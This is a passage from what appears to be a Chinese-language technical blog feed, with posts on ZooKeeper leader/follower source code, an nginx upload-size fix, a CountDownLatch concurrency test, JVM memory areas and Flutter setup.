"</span></span><br><span class="line">                            + Long.toHexString(p.hdr.getZxid()));</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                packetsCommitted.remove();</span><br><span class="line">                <span class="comment">//封装请求信息</span></span><br><span class="line">                Request request = <span class="keyword">new</span> Request(<span class="keyword">null</span>, p.hdr.getClientId(),</span><br><span class="line">                        p.hdr.getCxid(), p.hdr.getType(), <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">                request.txn = p.rec;</span><br><span class="line">                request.hdr = p.hdr;</span><br><span class="line">                <span class="comment">//提交请求</span></span><br><span class="line">                ozk.commitRequest(request);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// New server type need to handle in-flight packets</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">"Unknown server type"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Follower-的-followLeader-方法"><a href="#Follower-的-followLeader-方法" class="headerlink" title="Follower 的 followLeader 方法"></a>Follower 的 followLeader 方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">followLeader</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        self.end_fle = Time.currentElapsedTime();</span><br><span class="line">        <span class="keyword">long</span> electionTimeTaken = self.end_fle - self.start_fle;</span><br><span class="line">        self.setElectionTimeTaken(electionTimeTaken);</span><br><span class="line">        LOG.info(<span class="string">"FOLLOWING - LEADER ELECTION TOOK - &#123;&#125;"</span>, electionTimeTaken);</span><br><span class="line">        self.start_fle = <span class="number">0</span>;</span><br><span class="line">        self.end_fle = <span class="number">0</span>;</span><br><span class="line">        fzk.registerJMX(<span class="keyword">new</span> FollowerBean(<span class="keyword">this</span>, zk), self.jmxLocalPeerBean);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            QuorumServer leaderServer = findLeader();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                connectToLeader(leaderServer.addr, leaderServer.hostname);</span><br><span class="line">                <span class="keyword">long</span> newEpochZxid = registerWithLeader(Leader.FOLLOWERINFO);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//check to see if the leader zxid is lower than ours</span></span><br><span class="line">                <span class="comment">//this should never happen but is just a safety check</span></span><br><span class="line">                <span class="keyword">long</span> newEpoch = ZxidUtils.getEpochFromZxid(newEpochZxid);</span><br><span class="line">                <span class="keyword">if</span> (newEpoch &lt; self.getAcceptedEpoch()) &#123;</span><br><span class="line">                    LOG.error(<span class="string">"Proposed leader epoch "</span> + ZxidUtils.zxidToString(newEpochZxid)</span><br><span class="line">                            + <span class="string">" is less than our accepted epoch "</span> + ZxidUtils.zxidToString(self.getAcceptedEpoch()));</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Error: Epoch of leader is lower"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//和leader同步信息</span></span><br><span class="line">                syncWithLeader(newEpochZxid);</span><br><span class="line">                QuorumPacket qp = <span class="keyword">new</span> QuorumPacket();</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">this</span>.isRunning()) &#123;</span><br><span class="line">                    readPacket(qp);</span><br><span class="line">                    processPacket(qp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOG.warn(<span class="string">"Exception when following the leader"</span>, e);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    sock.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// clear pending revalidations</span></span><br><span class="line">                pendingRevalidations.clear();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            zk.unregisterJMX((Learner)<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Leader-的-lead-方法"><a href="#Leader-的-lead-方法" class="headerlink" title="Leader 的 lead 方法"></a>Leader 的 lead 方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lead</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//选举结束时间</span></span><br><span class="line">        self.end_fle = Time.currentElapsedTime();</span><br><span class="line">        <span class="comment">//选举耗时</span></span><br><span class="line">        <span class="keyword">long</span> electionTimeTaken = self.end_fle - self.start_fle;</span><br><span class="line">        self.setElectionTimeTaken(electionTimeTaken);</span><br><span class="line">        LOG.info(<span class="string">"LEADING - LEADER ELECTION TOOK - &#123;&#125;"</span>, electionTimeTaken);</span><br><span class="line">        self.start_fle = <span class="number">0</span>;</span><br><span class="line">        self.end_fle = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//注册Leader JMX</span></span><br><span class="line">        zk.registerJMX(<span class="keyword">new</span> LeaderBean(<span class="keyword">this</span>, zk), self.jmxLocalPeerBean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            self.tick.set(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">//加载db数据到内存</span></span><br><span class="line">            zk.loadData();</span><br><span class="line">            <span class="comment">//状态对比封装</span></span><br><span class="line">            leaderStateSummary = <span class="keyword">new</span> StateSummary(self.getCurrentEpoch(), zk.getLastProcessedZxid());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Start thread that waits for connection requests from</span></span><br><span class="line">            <span class="comment">// new followers.</span></span><br><span class="line">            <span class="comment">//启动接收follower的请求线程</span></span><br><span class="line">            cnxAcceptor = <span class="keyword">new</span> LearnerCnxAcceptor();</span><br><span class="line">            cnxAcceptor.start();</span><br><span class="line"></span><br><span class="line">            readyToStart = <span class="keyword">true</span>;</span><br><span class="line">            <span class="comment">//获取epoch</span></span><br><span class="line">            <span class="keyword">long</span> epoch = getEpochToPropose(self.getId(), self.getAcceptedEpoch());</span><br><span class="line"></span><br><span class="line">            zk.setZxid(ZxidUtils.makeZxid(epoch, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">synchronized</span>(<span class="keyword">this</span>)&#123;</span><br><span class="line">                lastProposed = zk.getZxid();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            newLeaderProposal.packet = <span class="keyword">new</span> QuorumPacket(NEWLEADER, zk.getZxid(),</span><br><span class="line">                    <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((newLeaderProposal.packet.getZxid() &amp; <span class="number">0xffffffffL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                LOG.info(<span class="string">"NEWLEADER proposal has Zxid of "</span></span><br><span class="line">                        + Long.toHexString(newLeaderProposal.packet.getZxid()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//等待ack响应</span></span><br><span class="line">            waitForEpochAck(self.getId(), leaderStateSummary);</span><br><span class="line">            self.setCurrentEpoch(epoch);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// We have to get at least a majority of servers in sync with</span></span><br><span class="line">            <span class="comment">// us. We do this by waiting for the NEWLEADER packet to get</span></span><br><span class="line">            <span class="comment">// acknowledged</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//等待半数server响应</span></span><br><span class="line">                waitForNewLeaderAck(self.getId(), zk.getZxid());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                shutdown(<span class="string">"Waiting for a quorum of followers, only synced with sids: [ "</span></span><br><span class="line">                        + getSidSetString(newLeaderProposal.ackSet) + <span class="string">" ]"</span>);</span><br><span class="line">                HashSet&lt;Long&gt; followerSet = <span class="keyword">new</span> HashSet&lt;Long&gt;();</span><br><span class="line">                <span class="keyword">for</span> (LearnerHandler f : learners)</span><br><span class="line">                    followerSet.add(f.getSid());</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (self.getQuorumVerifier().containsQuorum(followerSet)) &#123;</span><br><span class="line">                    LOG.warn(<span class="string">"Enough followers present. "</span></span><br><span class="line">                            + <span class="string">"Perhaps the initTicks need to be increased."</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                Thread.sleep(self.tickTime);</span><br><span class="line">                self.tick.incrementAndGet();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//启动zkserver</span></span><br><span class="line">            startZkServer();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * WARNING: do not use this for anything other than QA testing</span></span><br><span class="line"><span class="comment">             * on a real cluster. Specifically to enable verification that quorum</span></span><br><span class="line"><span class="comment">             * can handle the lower 32bit roll-over issue identified in</span></span><br><span class="line"><span class="comment">             * ZOOKEEPER-1277. Without this option it would take a very long</span></span><br><span class="line"><span class="comment">             * time (on order of a month say) to see the 4 billion writes</span></span><br><span class="line"><span class="comment">             * necessary to cause the roll-over to occur.</span></span><br><span class="line"><span class="comment">             *</span></span><br><span class="line"><span class="comment">             * This field allows you to override the zxid of the server. Typically</span></span><br><span class="line"><span class="comment">             * you'll want to set it to something like 0xfffffff0 and then</span></span><br><span class="line"><span class="comment">             * start the quorum, run some operations and see the re-election.</span></span><br><span class="line"><span class="comment">              测试使用</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            String initialZxid = System.getProperty(<span class="string">"zookeeper.testingonly.initialZxid"</span>);</span><br><span class="line">            <span class="keyword">if</span> (initialZxid != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">long</span> zxid = Long.parseLong(initialZxid);</span><br><span class="line">                zk.setZxid((zk.getZxid() &amp; <span class="number">0xffffffff00000000L</span>) | zxid);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!System.getProperty(<span class="string">"zookeeper.leaderServes"</span>, <span class="string">"yes"</span>).equals(<span class="string">"no"</span>)) &#123;</span><br><span class="line">                self.cnxnFactory.setZooKeeperServer(zk);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Everything is a go, simply start counting the ticks</span></span><br><span class="line">            <span class="comment">// WARNING: I couldn't find any wait statement on a synchronized</span></span><br><span class="line">            <span class="comment">// block that would be notified by this notifyAll() call, so</span></span><br><span class="line">            <span class="comment">// I commented it out</span></span><br><span class="line">            <span class="comment">//synchronized (this) &#123;</span></span><br><span class="line">            <span class="comment">//    notifyAll();</span></span><br><span class="line">            <span class="comment">//&#125;</span></span><br><span class="line">            <span class="comment">// We ping twice a tick, so we only update the tick every other</span></span><br><span class="line">            <span class="comment">// iteration</span></span><br><span class="line">            <span class="keyword">boolean</span> tickSkip = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                Thread.sleep(self.tickTime / <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">if</span> (!tickSkip) &#123;</span><br><span class="line">                    self.tick.incrementAndGet();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//同步set</span></span><br><span class="line">                HashSet&lt;Long&gt; syncedSet = <span class="keyword">new</span> HashSet&lt;Long&gt;();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// lock on the followers when we use it.</span></span><br><span class="line">                syncedSet.add(self.getId());</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (LearnerHandler f : getLearners()) &#123;</span><br><span class="line">                    <span class="comment">// Synced set is used to check we have a supporting quorum, so only</span></span><br><span class="line">                    <span class="comment">// PARTICIPANT, not OBSERVER, learners should be used</span></span><br><span class="line">                    <span class="comment">//PARTICIPANT类型加入同步set</span></span><br><span class="line">                    <span class="keyword">if</span> (f.synced() &amp;&amp; f.getLearnerType() == LearnerType.PARTICIPANT) &#123;</span><br><span class="line">                        syncedSet.add(f.getSid());</span><br><span class="line">                    &#125;</span><br><span class="line">                    f.ping();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//检查leader运行状态</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">this</span>.isRunning()) &#123;</span><br><span class="line">                    shutdown(<span class="string">"Unexpected internal error"</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (!tickSkip &amp;&amp; !self.getQuorumVerifier().containsQuorum(syncedSet)) &#123;</span><br><span class="line">                <span class="comment">//if (!tickSkip &amp;&amp; syncedCount &lt; self.quorumPeers.size() / 2) &#123;</span></span><br><span class="line">                    <span class="comment">// Lost quorum, shutdown</span></span><br><span class="line">                    shutdown(<span class="string">"Not sufficient followers synced, only synced with sids: [ "</span></span><br><span class="line">                            + getSidSetString(syncedSet) + <span class="string">" ]"</span>);</span><br><span class="line">                    <span class="comment">// make sure the order is the same!</span></span><br><span class="line">                    <span class="comment">// the leader goes to looking</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              tickSkip = !tickSkip;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            zk.unregisterJMX(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><blockquote>
<ul>
<li>集群最主要的就是 leader 选举和广播,默认的选举算法是 FastLeaderElection,observer 不参与投票。</li>
<li>zookeeper 内部有大量 NIO 的请求响应,处理客户端请求和 leader 选举的线程是分离的。</li>
<li>线程、并发锁、wait/notify 机制等在 zookeeper 中大量应用.</li>
<li>下边是经典的 paxos 算法的理论和证明过程.</li>
</ul>
</blockquote>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://cwiki.apache.org/confluence/display/zookeeper/zab1.0" target="_blank" rel="noopener">Aapche zookeeper zab1.0 wiki </a></li>
<li><a href="http://www.tcs.hut.fi/Studies/T-79.5001/reports/2012-deSouzaMedeiros.pdf" target="_blank" rel="noopener">ZooKeeper’s atomic broadcast protocol:Theory and practice</a></li>
<li><a href="https://www.hpl.hp.com/techreports/Compaq-DEC/SRC-RR-49.pdf" target="_blank" rel="noopener">The Part-Time Parliament</a></li>
<li><a href="https://lamport.azurewebsites.net/pubs/lamport-paxos.pdf" target="_blank" rel="noopener">The Part-Time Parliament</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>413 Request Entity Too Large</title>
    <url>/2018/12/11/java/exception/413%20Request%20Entity%20Too%20Large/</url>
    <content><![CDATA[<p>通过nginx的代理层上传文件,出现这个错误。大意很简单，请求体太长,意思是文件的尺寸太大。需要调整client_max_body_size 的大小,默认大小为1m.<br><a id="more"></a><br>可以在 server、location、http等位置处配置此参数。</p>
<p>咱们在server下配置,文件大小最大5m。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">client_max_body_size 5m;</span><br></pre></td></tr></table></figure></p>
<p>配置完成后,重启nginx,但是偶尔会报Gateway 504 Time out。修改代理的超时时间问题解决:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location ^~/api/v1/human &#123;</span><br><span class="line">                  proxy_pass  http://localhost:8082;</span><br><span class="line">                  proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">                  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">                  proxy_connect_timeout 70s;</span><br><span class="line">                  proxy_send_timeout 70s;</span><br><span class="line">                  proxy_read_timeout 70s;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://nginx.org/en/docs/" target="_blank" rel="noopener">nginx官网配置文档</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title>CountDownLatch模拟并发测试</title>
    <url>/2021/04/22/java/JUC/CountDownLatch%E6%A8%A1%E6%8B%9F%E5%B9%B6%E5%8F%91%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>CountDownLatch 是一个同步工具类，它允许一个或多个线程一直等待，直到其他线程的操作执行完后再执行。</p>
<p>本文就来用CountDownLatch来实现一个并发测试的场景.</p>
<a id="more"></a>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> COUNT = <span class="number">5</span>;<span class="comment">//模拟五个线程的并发</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 模拟并发</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">currentTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// 设置线程总数为1</span></span><br><span class="line">    CountDownLatch countDownLatch = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; COUNT; i++) &#123;</span><br><span class="line">      <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 进来一个线程，阻塞</span></span><br><span class="line">          countDownLatch.await();</span><br><span class="line">          <span class="comment">// 只打印了一句话,具体场景可以做接口调用</span></span><br><span class="line">          System.out.println(Thread.currentThread().getName() + <span class="string">","</span> + System.currentTimeMillis());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 直到主线程执行完成,count减去1,五个线程同时执行业务</span></span><br><span class="line">    countDownLatch.countDown();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>可以调用此方法，看到输出信息，多个线程都是同一时刻执行的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Thread-0,1619405790912</span><br><span class="line">Thread-1,1619405790912</span><br><span class="line">Thread-2,1619405790912</span><br><span class="line">Thread-3,1619405790912</span><br></pre></td></tr></table></figure>
<p>这样就模拟了平时的接口并发测试。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式之构建器模式</title>
    <url>/2018/06/04/java/designpattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E6%9E%84%E5%BB%BA%E5%99%A8%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>构建器模式(建造者模式/Builder模式),是将一个复杂对象的构建和它的表示分离,使得同样的构建过程可以创建不同的表示.<br><a id="more"></a></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM内存区域</title>
    <url>/2018/11/01/java/jvm/JVM%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F/</url>
    <content><![CDATA[<p>Java 虚拟机定义了在程序执行期间使用的各种运行时数据区域。其中一些数据区域是在 Java 虚拟机启动时创建的，仅在 Java 虚拟机退出时销毁。其他数据区域仅在当前线程有效。线程数据区域是在线程创建时创建和销毁线程时销毁的,和线程同生共死。<br>本节以 JDK1.8 为例来探讨 java 的内存区域和内存溢出异常诊断。</p>
<a id="more"></a>
<h1 id="一、-java-内存区域"><a href="#一、-java-内存区域" class="headerlink" title="一、 java 内存区域"></a>一、 java 内存区域</h1><p>java 运行时数据区域一共包括六个部分,<br><img src="/2018/11/01/java/jvm/JVM内存区域/JVM_1.png" alt><br>pc 寄存器(程序计数器)、堆、栈、方法区、本地方法栈、运行时常量池。</p>
<h2 id="pc-寄存器-程序计数器"><a href="#pc-寄存器-程序计数器" class="headerlink" title="pc 寄存器(程序计数器)"></a>pc 寄存器(程序计数器)</h2><p>Java 虚拟机可以同时支持许多执行线程。每个 Java 虚拟机线程都有自己的 pc（程序计数器）寄存器。在任何时候，每个 Java 虚拟机线程都在执行单个方法的代码，即该线程的当前方法。如果该方法不是本机方法，则 pc 寄存器包含当前正在执行的 Java 虚拟机指令的地址。如果线程当前正在执行的方法是 native 的,则 Java 虚拟机的 pc 寄存器的值是未定义的。Java 虚拟机的 pc 寄存器足够宽,可以在特定平台上保存<a href="https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-2.html#jvms-2.3.3" target="_blank" rel="noopener">returnAddress</a>或本机指针。程序计数器也是 java 内存区域中唯一一块没有 OutOfMemeryError 的区域。</p>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>Java 虚拟机具有在所有 Java 虚拟机线程之间共享的堆。堆是运行时数据区，从中分配所有类实例和数组的内存。</p>
<p>堆是在虚拟机启动时创建的。对象的堆存储由自动存储管理系统（称为垃圾收集器）回收;对象永远不会被显式释放。 Java 虚拟机假设没有特定类型的自动存储管理系统，可以根据实现者的系统要求选择存储管理技术。堆可以具有固定大小，或者可以根据计算的需要进行扩展，并且如果不需要更大的堆，则可以收缩。堆的内存不需要是连续的。</p>
<p>Java 虚拟机实现可以为程序员或用户提供对堆的初始大小的控制，以及如果可以动态扩展或收缩堆，控制最大和最小内存空间限制。</p>
<p>以下异常情况与堆相关联：</p>
<blockquote>
<ul>
<li>如果计算需要的堆数超过自动存储管理系统可用的堆，则 Java 虚拟机会抛出 OutOfMemoryError。</li>
</ul>
</blockquote>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>每个 Java 虚拟机线程都有一个私有 Java 虚拟机堆栈，与线程同时创建。 Java 虚拟机堆栈存储帧。 Java 虚拟机堆栈类似于传统语言的堆栈，例如 C：它保存局部变量和部分结果，并在方法调用和返回中起作用。由于除了推送和弹出帧之外，永远不会直接操作 Java 虚拟机堆栈，因此可以对堆进行堆分配。 Java 虚拟机堆栈的内存不需要是连续的。</p>
<p>在 Java® 虚拟机规范的第一版中，Java 虚拟机堆栈称为 Java 堆栈。</p>
<p>此规范允许 Java 虚拟机堆栈具有固定大小或根据计算的需要动态扩展和收缩。如果 Java 虚拟机堆栈具有固定大小，则可以在创建该堆栈时独立选择每个 Java 虚拟机堆栈的大小。</p>
<p>Java 虚拟机实现可以为程序员或用户提供对 Java 虚拟机堆栈的初始大小的控制，以及在动态扩展或收缩 Java 虚拟机堆栈的情况下，控制最大和最小内存空间限制。</p>
<p>以下异常条件与 Java 虚拟机堆栈相关联：</p>
<blockquote>
<ul>
<li><p>如果线程中的计算需要比允许的更大的 Java 虚拟机堆栈，则 Java 虚拟机会抛出 StackOverflowError。</p>
</li>
<li><p>如果可以动态扩展 Java 虚拟机堆栈，并且尝试进行扩展但可以使内存不足以实现扩展，或者可以使内存不足以为新线程创建初始 Java 虚拟机堆栈，则 Java Virtual 机器抛出 OutOfMemoryError。</p>
</li>
</ul>
</blockquote>
<h2 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h2><p>Java 虚拟机具有在所有 Java 虚拟机线程之间共享的方法区域。方法区域类似于传统语言的编译代码的存储区域或类似于操作系统进程中的“text”段。它存储每个类的结构，例如运行时常量池，字段和方法数据，以及方法和构造函数的代码，包括类和实例初始化以及接口初始化中使用的特殊方法。</p>
<p>方法区域是在虚拟机启动时创建的。虽然方法区域在逻辑上是堆的一部分，但是简单的实现可能选择不垃圾收集或压缩它。本规范未规定方法区域的位置或用于管理编译代码的策略。方法区域可以是固定大小的，或者可以根据计算的需要进行扩展，并且如果不需要更大的方法区域，则可以缩小方法区域。方法区域的内存不需要是连续的。<br>以下异常条件与方法区域相关联：</p>
<blockquote>
<ul>
<li>如果无法使方法区域中的内存满足分配请求，则 Java 虚拟机将抛出 OutOfMemoryError。</li>
</ul>
</blockquote>
<h2 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h2><p>Java 虚拟机的实现可以使用传统的堆栈，俗称“C 栈”，以支持本机方法（用 Java 编程语言以外的语言编写的方法）。本机方法堆栈也可以用于以诸如 C 语言的 Java 虚拟机的指令集的解释器的实现来使用。无法加载本机方法并且本身不依赖于传统堆栈的 Java 虚拟机实现不需要提供本机方法栈。如果提供，则通常在创建每个线程时为每个线程分配本机方法堆栈。</p>
<p>此规范允许本机方法堆栈具有固定大小或根据计算的需要动态扩展和收缩。如果本机方法堆栈具有固定大小，则可以在创建该堆栈时独立地选择每个本机方法堆栈的大小。</p>
<p>Java 虚拟机实现可以为程序员或用户提供对本机方法堆栈的初始大小的控制，以及在不同大小的本机方法堆栈的情况下，控制最大和最小方法堆栈大小。</p>
<p>以下异常条件与本机方法堆栈相关联：</p>
<blockquote>
<ul>
<li><p>如果线程中的计算需要比允许的更大的本机方法堆栈，则 Java 虚拟机会抛出 StackOverflowError。</p>
</li>
<li><p>如果可以动态扩展本机方法堆栈并尝试本机方法堆栈扩展但可用内存不足，或者如果可用内存不足以为新线程创建初始本机方法堆栈，则 Java 虚拟机会抛出 OutOfMemoryError 。</p>
</li>
</ul>
</blockquote>
<h2 id="运行时常量池"><a href="#运行时常量池" class="headerlink" title="运行时常量池"></a>运行时常量池</h2><p>运行时常量池是 class 文件中 constant_pool 表的每类或每接口运行时表示。它包含几种常量，从编译时已知的数字文字到必须在运行时解析的方法和字段引用。运行时常量池提供类似于传统编程语言的符号表的功能，尽管它包含比典型符号表更宽范围的数据。每个运行时常量池都是从 Java 虚拟机的方法区中分配的。<br>当 Java 虚拟机创建类或接口时，将构造类或接口的运行时常量池。</p>
<p>在常量池中可能会抛出下边的异常:</p>
<blockquote>
<ul>
<li>如果内存不足以分配新的空间,则会抛出 OutOfMemoryError。</li>
</ul>
</blockquote>
<p>如有错误,欢迎批评指正,望不吝赐教。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p>《深入理解 java 虚拟机》周志明著</p>
</li>
<li><p><a href="https://docs.oracle.com/javase/specs/jvms/se8/html/index.html" target="_blank" rel="noopener">The Java Virtual Machine Specification Java SE 8 Edition</a></p>
</li>
<li><p><a href="https://docs.oracle.com/javase/specs/" target="_blank" rel="noopener">各个版本的 java&amp;虚拟机规范文档</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title>Flutter开发环境搭建</title>
    <url>/2021/05/23/mobile/android/flutter%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><blockquote>
<ul>
<li>Android Studio</li>
<li>Android SDK</li>
<li>Flutter SDK</li>
</ul>
</blockquote>
<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>以上工具软件安装完成后，配置好Flutter 和android sdk的环境变量。接着按照flutter官方文档来执行命令检测一下是否还需要安装其他依赖。</p>
<p>若有问题，会以一下方式提示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[-] Android toolchain - develop for Android devices</span><br><span class="line">    • Android SDK at D:\Android\sdk</span><br><span class="line">    ✗ Android SDK is missing command line tools; download from https://goo.gl/XxQghQ</span><br><span class="line">    • Try re-installing or updating your Android SDK,</span><br><span class="line">      visit https://flutter.io/setup/#android-setup for detailed instructions.</span><br></pre></td></tr></table></figure>
<p>按照提示，完成依赖的安装配置即可，再次检测，最终如下图表示环境依赖已经处理完成。</p>
<p><img src="/2021/05/23/mobile/android/flutter开发/2021-05-23_112637.jpg" alt></p>
<h1 id="第一个项目"><a href="#第一个项目" class="headerlink" title="第一个项目"></a>第一个项目</h1><p>打开android studio ，安装flutter 和dart插件。</p>
<p>新建一个flutter项目，设置项目名称等信息后项目就自动搭建好了。</p>
<p><img src="/2021/05/23/mobile/android/flutter开发/2021-05-23_113227.jpg" alt></p>
<p><img src="/2021/05/23/mobile/android/flutter开发/2021-05-23_113433.jpg" alt></p>
<p>先启动模拟器，检测到模拟器后直接运行即可在模拟器中看到刚刚的application。</p>
<p><img src="/2021/05/23/mobile/android/flutter开发/2021-05-23_114737.jpg" alt></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>![<a href="https://flutterchina.club/" target="_blank" rel="noopener">Flutter中文网</a>]</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>flutter</category>
      </categories>
